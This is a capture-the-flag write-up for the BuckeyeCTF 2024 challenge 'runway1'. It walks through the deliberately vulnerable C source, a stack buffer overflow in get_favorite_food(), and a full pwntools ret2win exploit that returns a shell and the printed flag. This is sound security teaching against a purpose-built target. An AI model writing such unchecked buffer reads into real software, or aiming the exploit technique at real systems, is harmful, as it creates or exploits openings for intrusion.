# runway1 [217 solves]
### Challenge Description
> Starting to ramp up!

`nc challs.pwnoh.io 13401`
### Challenge Author 
> Author: kanderoo
# Challenge Files 
we are given the source file that was used for compiling the binary
```c filename=runway1.c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <fcntl.h>
#include <sys/sendfile.h>

int win() {
    printf("You win! Here is your shell:\n");

    system("/bin/sh");
}

int get_favorite_food() {
    char food[64];

    printf("What is your favorite food?\n");
    fflush(stdout);

    fgets(food, 100, stdin);

    printf("Hmmm..... %s...", food);
}

int main() {
    int rand_num;

    srand(time(0));
    rand_num = rand() % 100;

    get_favorite_food();

    if (rand_num <= 50) {
        printf("That sounds delicious!\n");
    } else if (rand_num <= 70) {
        printf("Eh, that sounds okay.\n");
    } else if (rand_num <= 80) {
        printf("That's my favorite food too!\n");
    } else if (rand_num <= 90) {
        printf("I've never tried that before!\n");
    } else if (rand_num <= 100) {
        printf("Ew! I would never eat that.\n");
    }

    return 0;
}
```
# Solution
## Analysis of the Binary
first analyse the provided binary. 
```bash 
fooker@fooker:~/buckeyectf2024/pwn/runway1$ checksec runway1
[*] '~/buckeyectf2024/pwn/runway1/runway1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
```bash
fooker@fooker:~/buckeyectf2024/pwn/runway1$ file runway1
runway1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2b092185b4262b248428bafe265a9462b3c5daa1, for GNU/Linux 3.2.0, not stripped
```
the provided binary is a `32-bit dynamically linked ELF. a quick look at the source file reveals a `win()` function
```c
int win() {
    printf("You win! Here is your shell:\n");

    system("/bin/sh");
}
```
if we could hijack the control flow and redirect it to the `win()` function then that would pop a shell.

## Buffer Overflow
in the `get_favorite_food()` procedure, we have a buffer `food` of size `64 bytes whereas the line
```c
fgets(food, 100, stdin);
```
let's us read `100 bytes` into the buffer which is enough to overflow it. since the binary does not have a stack canary, we could therefore directly `ret2win`. 
## Exploit
i calculated the offset of the buffer from the base pointer `ebp` and that seemed to be about `72 bytes` therefore, we must send 
```py
payload = b'A' * (72 + 4) + p32(elf.symbols['win'])
```
to overwrite the return address and hijack the control flow.

here's the full exploit
```py
from pwn import *

exe = './runway1'
elf = context.binary = ELF(exe, checksec=True)

host = 'challs.pwnoh.io'
port = 13401

r = remote(host, port, level='DEBUG')

r.recvuntil(b'food?\n')

payload = b'A' * 76 + p32(elf.symbols['win'])

r.sendline(payload)

r.interactive()
```
we could run this 
```bash
fooker@fooker:~/buckeyectf2024/pwn/runway1$ python3 exploit.py
[*] '~/buckeyectf2024/pwn/runway1/runway1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to challs.pwnoh.io on port 13401: Done
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
bctf{I_34t_fl4GS_4_bR34kf4st_7c639e33ffcfe8c2}$
```
and that gives us the flag

## Flag
`bctf{I_34t_fl4GS_4_bR34kf4st_7c639e33ffcfe8c2}`